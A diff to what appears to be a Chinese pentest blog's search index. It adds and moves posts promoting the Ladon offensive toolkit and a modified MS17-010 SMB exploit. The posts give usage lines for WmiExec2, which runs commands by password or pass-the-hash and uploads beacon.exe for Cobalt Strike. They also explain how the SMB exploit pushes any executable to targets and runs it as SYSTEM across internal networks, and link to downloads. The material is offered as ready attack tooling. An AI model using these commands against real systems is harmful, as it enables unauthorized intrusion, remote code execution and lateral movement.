@@ -1309,6 +1309,79 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
       </tags>
   </entry>
   <entry>
+    <title>〖教程〗Ladon 8.2新增NTLM探测Windows版本</title>
+    <url>/p/ntlminfo.html</url>
+    <content><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+<script language="javascript" type="text/javascript">
+window.location.href="http://k8gege.org/Ladon/ntlminfo.html";
+</script>
+
+
+
+<h3 id="Ladon8-2更新功能"><a href="#Ladon8-2更新功能" class="headerlink" title="Ladon8.2更新功能"></a>Ladon8.2更新功能</h3><p>基于NTLM探测Windows版本信息</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] WmiInfo 		(135)</span><br><span class="line">[+] SmbInfo 		(445)</span><br><span class="line">[+] WinrmInfo 		(5985/80/8080/443)</span><br><span class="line">[+] MssqlInfo		(1433)</span><br><span class="line">[+] ExchangeInfo	(443)</span><br><span class="line">[+] RdpInfo			(3389)</span><br><span class="line">[+] WmiExec2		支持文件上传、Base64cmd解决CS解析空格引号的问题</span><br><span class="line">[+] Ping			重新启用系统Ping检测存活主机(目标PS1版本检测不到)</span><br></pre></td></tr></table></figure>
+
+<p>LadonGUI 8.2 2021.5.15<br>[+]Base64 Unicdoe    主要用于WmiExec2或PowerShell命令的BASE64加密解密</p>
+<h3 id="Ladon模块使用例子"><a href="#Ladon模块使用例子" class="headerlink" title="Ladon模块使用例子"></a>Ladon模块使用例子</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C段：Ladon 192.168.1.8/24 WmiInfo</span><br><span class="line">C段：Ladon 192.168.1.8/c WmiInfo</span><br><span class="line">B段：Ladon 192.168.1.8/b WmiInfo</span><br><span class="line">A段：Ladon 192.168.1.8/a WmiInfo</span><br></pre></td></tr></table></figure>
+<p>批量IP(段)ip.txt、ip24.txt等请查看文档</p>
+<h3 id="Wmi探测信息"><a href="#Wmi探测信息" class="headerlink" title="Wmi探测信息"></a>Wmi探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WmiInfo.PNG"></p>
+<h3 id="Winrm探测信息"><a href="#Winrm探测信息" class="headerlink" title="Winrm探测信息"></a>Winrm探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WinrmInfo.PNG"></p>
+<h3 id="Smb探测信息"><a href="#Smb探测信息" class="headerlink" title="Smb探测信息"></a>Smb探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/SmbInfo.PNG"></p>
+<h3 id="Mssql探测信息"><a href="#Mssql探测信息" class="headerlink" title="Mssql探测信息"></a>Mssql探测信息</h3><p>EnumMssql为探测SqlServer版本等信息<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/MssqlInfo.PNG"></p>
+<h3 id="Exchange探测信息"><a href="#Exchange探测信息" class="headerlink" title="Exchange探测信息"></a>Exchange探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/ExchangeInfo.PNG"></p>
+<h3 id="Rdp探测信息"><a href="#Rdp探测信息" class="headerlink" title="Rdp探测信息"></a>Rdp探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/RdpInfo.PNG"></p>
+<h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.2版本：K8小密圈</p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+</div>]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>Ladon</tag>
+        <tag>ntlm</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>〖教程〗Ladon WmiExec2完美兼容Cobalt Strike</title>
+    <url>/p/wmiexec2.html</url>
+    <content><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+<script language="javascript" type="text/javascript">
+window.location.href="http://k8gege.org/Ladon/wmiexec2.html";
+</script>
+
+
+<h3 id="Ladon8-2更新功能"><a href="#Ladon8-2更新功能" class="headerlink" title="Ladon8.2更新功能"></a>Ladon8.2更新功能</h3><p>基于NTLM探测Windows版本信息</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] WmiInfo 		(135)</span><br><span class="line">[+] SmbInfo 		(445)</span><br><span class="line">[+] WinrmInfo 		(5985/80/8080/443)</span><br><span class="line">[+] MssqlInfo		(1433)</span><br><span class="line">[+] ExchangeInfo	(443)</span><br><span class="line">[+] RdpInfo			(3389)</span><br><span class="line">[+] WmiExec2		支持文件上传、Base64cmd解决CS解析空格引号的问题</span><br><span class="line">[+] Ping			重新启用系统Ping检测存活主机(目标PS1版本检测不到)</span><br></pre></td></tr></table></figure>
+
+<p>LadonGUI 8.2 2021.5.15<br>[+]Base64 Unicdoe    主要用于WmiExec2或PowerShell命令的BASE64加密解密</p>
+<h3 id="WmiExec说明"><a href="#WmiExec说明" class="headerlink" title="WmiExec说明"></a>WmiExec说明</h3><p>WmiExec  只需135端口通过注册表回显，不像Impacket或其它工具还依赖445，不依赖PowerShell，适用于任意目标<br>WmiExec2 和WmiExec一样只需135端口通过注册表回显，但依赖PowerShell，无PowerShell的目标可能不适用</p>
+<p>b64cmd和上版本的BypassUac一样，主要用于加密CMD命令，防止在CS下使用多参数CMD命令转义麻烦的问题</p>
+<h3 id="模块用法"><a href="#模块用法" class="headerlink" title="模块用法"></a>模块用法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Load WmiExec2</span><br><span class="line">Usage:</span><br><span class="line">Ladon WmiExec2 host user pass cmd whoami</span><br><span class="line">Ladon WmiExec2 pth host cmd whoami</span><br><span class="line">Base64Cmd <span class="keyword">for</span> Cobalt Strike</span><br><span class="line">Ladon WmiExec2 host user pass b64cmd whoami</span><br><span class="line">Ladon WmiExec2 host user pass b64cmd whoami</span><br><span class="line">Upload:</span><br><span class="line">Ladon WmiExec2 host user pass upload beacon.exe ceacon.exe</span><br><span class="line">Ladon WmiExec2 pth host upload beacon.exe ceacon.exe</span><br></pre></td></tr></table></figure>
+<p>批量IP(段)ip.txt、ip24.txt等请查看文档</p>
+<h3 id="WmiExec2执行"><a href="#WmiExec2执行" class="headerlink" title="WmiExec2执行"></a>WmiExec2执行</h3><p>在Cobalt Strike的shell下执行wmiexec需要带空格引号参数时，CS转义有问题，使用正常CMD命令比较麻烦，所以我增加了个b64cmd参数便于在CS下使用(这个方法在几个月前的BypassUac里使用，很多人不知道为什么这样做，直接CMD命令不好吗，非要经过一步加密，当你要执行的CMD命令含有很多转义时你就知道了，得经过CS转义成CMD转义得到正常CMD很麻烦)。b64cmd命令可通过LadonGUI 8.2使用Base64Unicode加密生成</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/Gui82.PNG"></p>
+<h4 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h4><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WmiExec2.PNG"></p>
+<h3 id="Wmi探测信息"><a href="#Wmi探测信息" class="headerlink" title="Wmi探测信息"></a>Wmi探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WmiInfo.PNG"></p>
+<h3 id="Winrm探测信息"><a href="#Winrm探测信息" class="headerlink" title="Winrm探测信息"></a>Winrm探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WinrmInfo.PNG"></p>
+<h3 id="Smb探测信息"><a href="#Smb探测信息" class="headerlink" title="Smb探测信息"></a>Smb探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/SmbInfo.PNG"></p>
+<h3 id="Mssql探测信息"><a href="#Mssql探测信息" class="headerlink" title="Mssql探测信息"></a>Mssql探测信息</h3><p>EnumMssql为探测SqlServer版本等信息<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/MssqlInfo.PNG"></p>
+<h3 id="Exchange探测信息"><a href="#Exchange探测信息" class="headerlink" title="Exchange探测信息"></a>Exchange探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/ExchangeInfo.PNG"></p>
+<h3 id="Rdp探测信息"><a href="#Rdp探测信息" class="headerlink" title="Rdp探测信息"></a>Rdp探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/RdpInfo.PNG"></p>
+<h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.2版本：K8小密圈</p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+</div>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>Ladon</tag>
+        <tag>wmi</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>无回显命令执行漏洞之PowerShell回显</title>
     <url>/p/Ladon_ps1_echo.html</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>很多时候命令回显漏洞由于一些特殊原因，无法构造或不方便构造回显，上回讲到JAVA反序列化漏洞Ladon回显方法。本文针对Windows系统实现命令执行漏洞回显方法，使用系统自带certutil或Powershell命令，虽说JAVA跨平台但并不代表所有系统都预装有JAVA，实际上.NET一样是跨平台的，前提都要系统安装才可以，那么对于未安装JAVA的机器或非JAVA程序产生的命令执行漏洞，如何实现命令回显，将是本文讲述的重点。JAVA篇：<a href="http://k8gege.org/Ladon/web_javarce.html">http://k8gege.org/Ladon/web_javarce.html</a></p>
@@ -1373,6 +1446,29 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
       </categories>
       <tags>
         <tag>LadonGo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>〖EXP〗LadonGUI 8.1新增ctr.sh证书查询子域名</title>
+    <url>/p/cve-2018-14847.html</url>
+    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>LadonGui 8.1的SubDomain模块新增网页提取子域名、ctr.sh证书域名提取以及3万字典扫描探测子域名(去年的扫描功能也与2300星的工具对比明显Ladon速度很快且效率高，当然大家也可更换字典或增加字段的)</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/Gui81_SubDomain.PNG"></p>
+<h3 id="CMD子域名扫描"><a href="#CMD子域名扫描" class="headerlink" title="CMD子域名扫描"></a>CMD子域名扫描</h3><p>Example: Ladon baidu.com SubDomain<br>需域名字典SubDomain.dic，字典上万个高效率子域名</p>
+<p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exe/SubDomain.gif"><br><img alt data-original="https://k8gege.github.io/k8img/Ladon/cs/CS_SubDomain.gif"></p>
+<p>去年与2300星的Subbrute对比,明显Ladon速度快很多倍 <a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a><br>作者说它的工具携带字典包含2000个常用子域名<br>先运行Subbrute几秒钟后再运行Ladon,直止GIF图片结束<br>Ladon已扫出上百个子域名，而Subbrute才扫出几个<br><img alt data-original="https://k8gege.github.io/k8img/Other/subbrute_subdomain.gif"></p>
+<p>对比结束后，又单独使用Subbrute扫描，发现不稳定需多次运行才出结果且速度慢<br>相比之下速度太慢，程序又大，也不稳定，所以从以前至今都没用过subbrute<br>因为想学习一下别人的思路，发现有很多文章提到，又发现2300星，才下该工具测试<br>没有使用该工具爆破子域名的另外一个原因是K8飞刀早就有子域名爆破功能<br><img alt data-original="https://k8gege.github.io/k8img/Other/subbrute.gif"></p>
+<h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><h4 id="LadonGo-ALL-OS"><a href="#LadonGo-ALL-OS" class="headerlink" title="LadonGo (ALL OS)"></a>LadonGo (ALL OS)</h4><p><a href="https://github.com/k8gege/LadonGo/releases" target="_blank" rel="noopener">https://github.com/k8gege/LadonGo/releases</a></p>
+<h4 id="Ladon-Windows-amp-Cobalt-Strike"><a href="#Ladon-Windows-amp-Cobalt-Strike" class="headerlink" title="Ladon (Windows &amp; Cobalt Strike)"></a>Ladon (Windows &amp; Cobalt Strike)</h4><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.2版本：K8小密圈</p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+</div>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>Ladon</tag>
+        <tag>SubDomain</tag>
       </tags>
   </entry>
   <entry>
@@ -5372,33 +5468,6 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
       </tags>
   </entry>
   <entry>
-    <title>SMB溢出工具加强版</title>
-    <url>/p/68a8bf1b.html</url>
-    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
-<p><strong>编译:</strong>python</p>
-<p><strong>漏洞:</strong>MS17-010</p>
-<p><strong>用法:</strong></p>
-<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
-<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
-<p><strong>内网批量</strong></p>
-<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
-<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
-<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
-<p>&nbsp;</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>提权</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>MS17010</tag>
-        <tag>SMB</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2019-0604 SharePoint GetShell Exploit</title>
     <url>/p/e896a7d1.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>漏洞信息</strong></span></p>
@@ -5495,6 +5564,33 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>GetShell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SMB溢出工具加强版</title>
+    <url>/p/68a8bf1b.html</url>
+    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
+<p><strong>编译:</strong>python</p>
+<p><strong>漏洞:</strong>MS17-010</p>
+<p><strong>用法:</strong></p>
+<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
+<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
+<p><strong>内网批量</strong></p>
+<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
+<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
+<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
+<p>&nbsp;</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>MS17010</tag>
+        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
